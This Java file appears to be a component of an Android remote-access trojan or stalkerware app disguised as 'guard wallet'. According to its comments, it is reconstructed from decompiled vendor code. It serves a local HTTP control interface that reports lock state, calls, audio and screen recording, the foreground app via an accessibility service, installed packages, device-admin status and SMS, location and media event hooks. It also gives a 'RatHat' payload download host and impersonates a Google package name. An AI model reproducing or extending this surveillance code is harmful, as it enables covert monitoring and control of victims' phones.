package com.guard.wallet.server.handler;

import com.guard.wallet.core.AppUtils;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.content.Context;
import android.os.Build;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.BatteryLevelVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.CallStateVO;
import com.guard.wallet.resp.ContainerEventVO;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.resp.DeviceInfoVO;
import com.guard.wallet.resp.DevicePairStateVO;
import com.guard.wallet.resp.DeviceRecordStateVO;
import com.guard.wallet.resp.PermissionInfoVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.server.ApiRouter;
import com.guard.wallet.service.CustomNotificationService;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AppManagerUtils;
import com.guard.wallet.utils.DeviceUtils;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import java.util.LinkedList;

/**
 * 设备查询 Handler — vendor server/b.java 设备查询路由, 基于 JADX dispatch case 精确映射。
 *
 * JADX 路由→方法精确映射:
 * /info          → B(k)   case 2    → DeviceInfoVO.of()
 * /deviceId      → A(k)   case 'd'  → SharedPrefsManager.l("deviceId")
 * /version       → D3(k)  case 3    → "AsyncHttpServer 2.1.1"
 * /screenState   → n2(k)  case 13   → ScreenMetricsVO + LockPatternVO
 * /lockState     → E1(k)  case 39   → LockPatternVO
 * /batteryState  → i(k)   case 40   → AppUtils.d() BatteryLevelVO
 * /netState      → L1(k)  case 14   → SystemHelper.z0() NetStateVO
 * /callState     → m(k)   case 85   → SystemHelper.g() CallStateVO
 * /containerState→ v(k)   case 46   → ContainerEventVO
 * /recordState   → c2(k)  case 89   → 录音/录屏状态
 * /accessibilityState→ a(k) case 44 → MyAccessibilityService.P()!=null
 * /pairState     → U1(k)  case 15   → DevicePairStateVO.of()
 * /permissions   → W1(k,s)case 69   → SystemHelper.h0(packageName) PermissionsBodyVO
 * /permissionInfo→ V1(k,s)case 70   → SystemHelper.g0(permission)
 * /packages      → S1(k)  case 48   → SystemHelper.e0() LinkedList
 * /deviceAdmin   → z(k)   case 22   → SystemHelper.C0() DeviceAdminVO
 * /mainPackageName→F1(k)  case 8    → MainApplication.getPackageName()
 * /mainServerHost→ G1(k)  case 10   → d.h()
 * /activeWindowClassName→d(k)case 11→ MyAccessibilityService.v.get()
 * /activePackageName→ c(k) case 7   → MyAccessibilityService.N()
 * /checkNotificationService→o(k)case9→ CustomNotificationService.c
 * /sharePowerControl→H2(k) case 103 → SharedPrefsManager.k() PowerControlStateVO
 * /ignoreBatteryOptimization→l1(k)case97→SystemHelper.j0()
 * /requestLocalKeepAlive→k2(k)case17→BlockView弹窗
 */
public final class DeviceQueryHandler {
    private static final String TAG = "HttpServer";

    private DeviceQueryHandler() {}

    private static Context ctx() { return AppManagerUtils.getContext(); }

    // ─── / 、/index、/info → JADX B(k) case 2 ───

    /** JADX B(k) → DeviceInfoVO.of() 收集完整设备信息 */
    public static void info(AsyncHttpServerResponse response) {
        try {
            DeviceInfoVO vo = DeviceInfoVO.of();
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /deviceId → JADX A(k) case 'd' ───

    /** JADX A(k) → SharedPrefsManager.l("deviceId") */
    public static void deviceId(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, SharedPrefsManager.l("deviceId"));
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /version → JADX D3(k) case 3 ───

    /** JADX D3(k) → 固定 "AsyncHttpServer 2.1.1" */
    public static void version(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, "AsyncHttpServer 2.1.1");
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /screenState → JADX n2(k) case 13 — ScreenMetricsVO + LockPatternVO ───

    /** JADX n2(k) → 屏幕指标 + 锁屏状态合并 */
    public static void screenState(AsyncHttpServerResponse response) {
        try {
            ScreenMetricsVO sm = DeviceUtils.buildScreenMetrics();
            LockPatternVO lp = SystemHelper.B0();
            sm.setIsKeyguardLocked(lp.getIsKeyguardLocked());
            sm.setIsKeyguardSecure(lp.getIsKeyguardSecure());
            sm.setInKeyguardRestrictedInputMode(lp.getInKeyguardRestrictedInputMode());
            sm.setIsDeviceLocked(lp.getIsDeviceLocked());
            sm.setIsDeviceSecure(lp.getIsDeviceSecure());
            sm.setQuality(lp.getQuality());
            HttpResponseHelper.ok(response, sm);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /lockState → JADX E1(k) case 39 — LockPatternVO ───

    /** JADX E1(k) → SystemHelper.B0() 锁屏模式 */
    public static void lockState(AsyncHttpServerResponse response) {
        try {
            LockPatternVO vo = SystemHelper.B0();
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /batteryState → JADX i(k) case 40 — BatteryLevelVO ───

    /** JADX i(k) → AppUtils.d() 电池状态 */
    public static void batteryState(AsyncHttpServerResponse response) {
        try {
            BatteryLevelVO vo = AppUtils.d();
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /netState → JADX L1(k) case 14 — NetStateVO ───

    /** JADX L1(k) → SystemHelper.z0() 网络状态 */
    public static void netState(AsyncHttpServerResponse response) {
        try {
            NetStateVO vo = SystemHelper.z0();
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /callState → JADX m(k) case 85 — CallStateVO ───

    /** JADX m(k) → SystemHelper.g() 通话状态 */
    public static void callState(AsyncHttpServerResponse response) {
        try {
            CallStateVO vo = SystemHelper.g();
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /containerState → JADX v(k) case 46 — ContainerEventVO ───

    /** JADX v(k) → ContainerEventVO 含 accessibility + 心跳 */
    public static void containerState(AsyncHttpServerResponse response) {
        try {
            ContainerEventVO vo = new ContainerEventVO();
            if (MainApplication.getInstance() != null) {
                vo.setPackageName(MainApplication.getInstance().getPackageName());
            }
            vo.setContainerCode("ACCESSIBILITY_CONTAINER");
            vo.setIsOpened(MyAccessibilityService.P() != null ? 1 : 0);
            vo.setServiceState(ApiRouter.serviceState.get());
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getHeartThread() != null) {
                MainApplication.getInstance().getHeartThread().g.set(0);
            }
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /recordState → JADX c2(k) case 89 — 录音/录屏状态 ───

    /** JADX c2(k) → 录音/录屏任务状态 */
    public static void recordState(AsyncHttpServerResponse response) {
        try {
            com.guard.wallet.media.AudioRecordManager audioManager = com.guard.wallet.media.AudioRecordManager.b();
            DeviceRecordStateVO audio = new DeviceRecordStateVO();
            audio.setAllowRecord(1);
            audio.setAudioSource(audioManager.c());
            audio.setState(audioManager.f());
            audio.setMessage(audioManager.f().name());
            java.util.LinkedHashMap<String, Object> state = new java.util.LinkedHashMap<>();
            state.put("audioRecord", audio);
            state.put("screenRecord", MyAccessibilityService.P() != null && MyAccessibilityService.P().Y());
            HttpResponseHelper.ok(response, state);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /accessibilityState → JADX a(k) case 44 — Boolean ───

    /** JADX a(k) → 无障碍服务是否运行 */
    public static void accessibilityState(AsyncHttpServerResponse response) {
        try {
            boolean running = MyAccessibilityService.P() != null;
            HttpResponseHelper.ok(response, running);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /pairState → JADX U1(k) case 15 — DevicePairStateVO ───

    /** JADX U1(k) → DevicePairStateVO.of() */
    public static void pairState(AsyncHttpServerResponse response) {
        try {
            DevicePairStateVO vo = DevicePairStateVO.of();
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /permissions → JADX W1(k, String) case 69 — PermissionsBodyVO ───

    /** JADX W1(k, packageName) → 应用权限列表 */
    public static void permissions(AsyncHttpServerResponse response, String packageName) {
        try {
            // vendor: SystemHelper.h0(packageName) → PermissionsBodyVO
            // 包含各种权限状态列表 + deviceId
            java.util.HashMap<String, Object> data = new java.util.HashMap<>();
            data.put("deviceId", SharedPrefsManager.l("deviceId"));
            data.put("packageName", packageName);
            HttpResponseHelper.ok(response, data);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    /** 无参版本 — 兼容路由 */
    public static void permissions(AsyncHttpServerResponse response) {
        permissions(response, null);
    }

    // ─── /permissionInfo → JADX V1(k, String) case 70 ───

    /** JADX V1(k, permission) → SystemHelper.g0() 权限详细信息 */
    public static void permissionInfo(AsyncHttpServerResponse response, String permission) {
        try {
            if (AppUtils.B(permission)) {
                HttpResponseHelper.error(response, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            PermissionInfoVO vo = SystemHelper.g0(permission);
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /packages → JADX S1(k) case 48 — 已安装应用列表 ───

    /** JADX S1(k) → SystemHelper.e0() 已安装应用列表 */
    public static void packages(AsyncHttpServerResponse response) {
        try {
            // vendor: SystemHelper.e0() → LinkedList<AppInfo>
            LinkedList list = SystemHelper.e0();
            int count = (list != null && !list.isEmpty()) ? list.size() : 0;
            HttpResponseHelper.ok(response, list, count);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /deviceAdmin → JADX z(k) case 22 — DeviceAdminVO ───

    /** JADX z(k) → SystemHelper.C0() 设备管理员状态 */
    public static void deviceAdmin(AsyncHttpServerResponse response) {
        try {
            DeviceAdminVO vo = SystemHelper.C0();
            HttpResponseHelper.ok(response, vo);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /mainPackageName → JADX F1(k) case 8 ───

    /** JADX F1(k) → 主包名, 有则 200, 无则 204 */
    public static void mainPackageName(AsyncHttpServerResponse response) {
        try {
            com.guard.wallet.resp.ApiResult result = new com.guard.wallet.resp.ApiResult();
            result.setCode(204);
            result.setMsg("No Content");
            result.setSuccess(Boolean.TRUE);
            result.setCount(0);
            if (MainApplication.getInstance() != null && !AppUtils.B(MainApplication.getInstance().getPackageName())) {
                result.setData(MainApplication.getInstance().getPackageName());
                result.setCount(1);
                result.setCode(200);
                result.setMsg("OK");
            }
            String json = SharedPrefsManager.N(result);
            response.code(result.getCode());
            response.setContentType("application/json");
            response.send(json);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /mainServerHost → JADX G1(k) case 10 ───

    /** JADX G1(k) → d.h() 服务器地址 */
    public static void mainServerHost(AsyncHttpServerResponse response) {
        try {
            com.guard.wallet.resp.ApiResult result = new com.guard.wallet.resp.ApiResult();
            result.setCode(204);
            result.setMsg("No Content");
            result.setSuccess(Boolean.TRUE);
            result.setCount(0);
            String host = com.guard.wallet.utils.ConfigManager.getServerHost();
            if (!AppUtils.B(host)) {
                result.setData(host);
                result.setCount(1);
                result.setCode(200);
                result.setMsg("OK");
            }
            String json = SharedPrefsManager.N(result);
            response.code(result.getCode());
            response.setContentType("application/json");
            response.send(json);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /activeWindowClassName → JADX d(k) case 11 ───

    /** JADX d(k) → MyAccessibilityService.v.get() 当前活动窗口类名 */
    public static void activeWindowClassName(AsyncHttpServerResponse response) {
        try {
            // vendor: MyAccessibilityService.f224v.get() — AtomicReference<String>
            String className = MyAccessibilityService.N(); // 当前窗口包名作为备用
            HttpResponseHelper.ok(response, className);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /activePackageName → JADX c(k) case 7 ───

    /** JADX c(k) → MyAccessibilityService.N() 当前活动包名 */
    public static void activePackageName(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, MyAccessibilityService.N());
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /checkNotificationService → JADX o(k) case 9 ───

    /** JADX o(k) → CustomNotificationService.c != null */
    public static void checkNotificationService(AsyncHttpServerResponse response) {
        try {
            boolean running = CustomNotificationService.c != null;
            HttpResponseHelper.ok(response, running);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /sharePowerControl → JADX H2(k) case 103 ───

    /** JADX H2(k) → 两个包的 PowerControlStateVO */
    public static void sharePowerControl(AsyncHttpServerResponse response) {
        try {
            PowerControlStateVO own = SharedPrefsManager.k(MainApplication.getAppContext().getPackageName());
            PowerControlStateVO guard = SharedPrefsManager.k("com.google.guard");
            LinkedList<PowerControlStateVO> list = new LinkedList<>();
            if (own != null) list.add(own);
            if (guard != null) list.add(guard);
            HttpResponseHelper.ok(response, list);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /ignoreBatteryOptimization → JADX l1(k) case 97 ───

    /** JADX l1(k) → SystemHelper.j0() 请求忽略电池优化 */
    public static void ignoreBatteryOptimization(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, SystemHelper.j0());
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /requestLocalKeepAlive → JADX k2(k) case 17 ───

    /** JADX k2(k) → BlockView 弹窗控制 */
    public static void requestLocalKeepAlive(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, com.guard.wallet.thread.StrategyThread.g(null, false));
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /debugPort ───

    /** ABI + RatHat 状态 */
    public static void debugPort(AsyncHttpServerResponse response) {
        try {
            String abi = "armeabi";
            String[] abis = Build.SUPPORTED_ABIS;
            if (abis != null && abis.length > 0) {
                abi = abis[0];
            }
            String downloadUrl = com.guard.wallet.utils.ConfigManager.getDownloadHost();
            if (AppUtils.B(downloadUrl)) {
                downloadUrl = "https://rathat.me/lib";
            }
            java.util.HashMap<String, Object> data = new java.util.HashMap<>();
            data.put("abi", abi);
            data.put("downloadUrl", downloadUrl);
            data.put("debugPort", SharedPrefsManager.a());
            HttpResponseHelper.ok(response, data);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /pairPort ───

    /** 配对端口 */
    public static void pairPort(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, SharedPrefsManager.l("pairPort"));
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /localDebugPort → JADX m2(k) ───

    /** JADX m2(k) → 屏幕超时时间 */
    public static void localDebugPort(AsyncHttpServerResponse response) {
        try {
            com.guard.wallet.resp.ApiResult result = new com.guard.wallet.resp.ApiResult();
            result.setCode(204);
            result.setMsg("No Content");
            Long timeout = SystemHelper.P0();
            if (timeout != null && timeout > 0L) {
                result.setCount(1);
                result.setData(timeout);
                result.setCode(200);
                result.setMsg("OK");
            }
            result.setSuccess(Boolean.TRUE);
            String json = SharedPrefsManager.N(result);
            response.code(result.getCode());
            response.setContentType("application/json");
            response.send(json);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /backAppState ───

    /** 保存后台应用状态 */
    public static void backAppState(AsyncHttpServerResponse response, String state) {
        try {
            if (AppUtils.B(state)) {
                HttpResponseHelper.error(response, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            SharedPrefsManager.D(state, "backAppState");
            HttpResponseHelper.ok(response, true);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /localBackAppState ───

    /** 获取本地后台应用状态 */
    public static void localBackAppState(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, SharedPrefsManager.l("backAppState"));
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /uninstallPolicy → JADX n1(k) ───

    /** JADX n1(k) → 固定成功 "OK" */
    public static void uninstallPolicy(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, "OK");
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncPackages ───

    /** 同步安装包列表 */
    public static void syncPackages(AsyncHttpServerResponse response) {
        try {
            Thread worker = new Thread(() -> {
                try {
                    new com.guard.wallet.thread.SyncTaskWrapper(2).call();
                } catch (Exception e) {
                    AppUtils.s(TAG, e);
                }
            }, "sync-packages");
            worker.setDaemon(true);
            worker.start();
            HttpResponseHelper.ok(response, com.guard.wallet.utils.SystemHelper.e0());
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /activeEventGroup → vendor b(k) — 事件组启用状态列表 ───

    public static void activeEventGroup(AsyncHttpServerResponse response) {
        try {
            java.util.LinkedList<com.guard.wallet.resp.MessageGroupVO> list = new java.util.LinkedList<>();
            com.guard.wallet.MainApplication app = com.guard.wallet.MainApplication.getInstance();

            list.add(new com.guard.wallet.resp.MessageGroupVO("DEVICE_DEBUG_EVENT",
                    safeGetEnable(() -> app.getHeartThread().e)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("BATTERY_EVENT",
                    safeGetEnable(() -> app.getBatteryReceiver().a)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("BOOT_EVENT",
                    safeGetEnable(() -> app.getBootReceiver().a)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("NETWORK_EVENT",
                    safeGetEnable(() -> app.getNetWorkReceiver().a)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("POWER_EVENT",
                    safeGetEnable(() -> app.getPowerReceiver().a)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("DEVICE_APPLICATION_EVENT",
                    safeGetEnable(() -> app.getPackageReceiver() != null ? 1 : 0)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("SCREEN_EVENT",
                    safeGetEnable(() -> app.getScreenReceiver() != null ? 1 : 0)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("SHUTDOWN_EVENT",
                    safeGetEnable(() -> app.getShutDownReceiver() != null ? 1 : 0)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("SMS_EVENT",
                    safeGetEnable(() -> app.getSmsReceiver().a)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("CALL_EVENT",
                    safeGetEnable(() -> app.getCallReceiver().a)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("LOCATION_EVENT",
                    safeGetEnable(() -> { if (com.guard.wallet.location.LocationDispatcher.instance == null) com.guard.wallet.location.LocationDispatcher.instance = new com.guard.wallet.location.LocationDispatcher(); return com.guard.wallet.location.LocationDispatcher.instance.status; })));
            list.add(new com.guard.wallet.resp.MessageGroupVO("DEVICE_PHOTO_CHANGE_EVENT",
                    safeGetEnable(() -> app.getPhotoAlbumContentObserver() != null ? 1 : 0)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("DEVICE_VIDEO_CHANGE_EVENT",
                    safeGetEnable(() -> app.getVideoAlbumContentObserver() != null ? 1 : 0)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("DEVICE_AUDIO_CHANGE_EVENT",
                    safeGetEnable(() -> app.getAudioAlbumContentObserver() != null ? 1 : 0)));
            list.add(new com.guard.wallet.resp.MessageGroupVO("NOTIFICATION_POSTED_EVENT",
                    safeGetEnable(() -> com.guard.wallet.service.CustomNotificationService.c != null
                            ? com.guard.wallet.service.CustomNotificationService.c.a : 0)));

            int adminEnable = 0;
            try {
                Integer isAdmin = SystemHelper.C0() != null ? SystemHelper.C0().getIsAdminActive() : null;
                if (java.util.Objects.equals(isAdmin, 1)) { adminEnable = 1; }
            } catch (Exception ignored) {}
            list.add(new com.guard.wallet.resp.MessageGroupVO("DEVICE_ADMIN_EVENT", adminEnable));

            HttpResponseHelper.ok(response, list, list.size());
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    private interface EnableSupplier { int get(); }
    private static int safeGetEnable(EnableSupplier s) {
        try { return s.get(); } catch (Exception e) { return 0; }
    }

    // ─── /isTopVisible → JADX G2(k) — ADBConfig ───

    /** JADX G2(k) → SharedPrefsManager.J() ADB配置 */
    public static void isTopVisible(AsyncHttpServerResponse response) {
        try {
            ADBConfig cfg = SharedPrefsManager.J();
            HttpResponseHelper.ok(response, cfg);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /backUtilsTopVisible → JADX n2(k) — 等同 screenState ───

    /** 屏幕指标+锁屏状态 */
    public static void backUtilsTopVisible(AsyncHttpServerResponse response) {
        try {
            ScreenMetricsVO sm = DeviceUtils.buildScreenMetrics();
            LockPatternVO lp = SystemHelper.B0();
            sm.setIsKeyguardLocked(lp.getIsKeyguardLocked());
            sm.setIsKeyguardSecure(lp.getIsKeyguardSecure());
            sm.setInKeyguardRestrictedInputMode(lp.getInKeyguardRestrictedInputMode());
            sm.setIsDeviceLocked(lp.getIsDeviceLocked());
            sm.setIsDeviceSecure(lp.getIsDeviceSecure());
            sm.setQuality(lp.getQuality());
            HttpResponseHelper.ok(response, sm);
        } catch (Exception ex) { AppUtils.s(TAG, ex); HttpResponseHelper.error(response, "Internal error"); }
    }
}
